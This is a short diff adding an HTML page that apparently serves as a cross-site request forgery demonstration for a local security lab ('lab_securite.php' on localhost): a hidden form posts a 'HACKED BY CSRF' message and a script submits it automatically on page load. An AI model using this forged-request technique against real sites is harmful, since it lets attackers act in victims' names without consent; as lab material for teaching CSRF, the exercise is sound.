@@ -1,0 +1,6 @@
+<form action="http://localhost:8000/lab_securite.php" method="POST">
+        <input type="hidden" name="content" value="J aime les poneys (HACKED BY CSRF)">
+        <input type="hidden" name="new_message" value="1">
+</form>
+    <!-- Ce script clique automatiquement sur le bouton envoyer -->
+<script>document.forms[0].submit();</script>
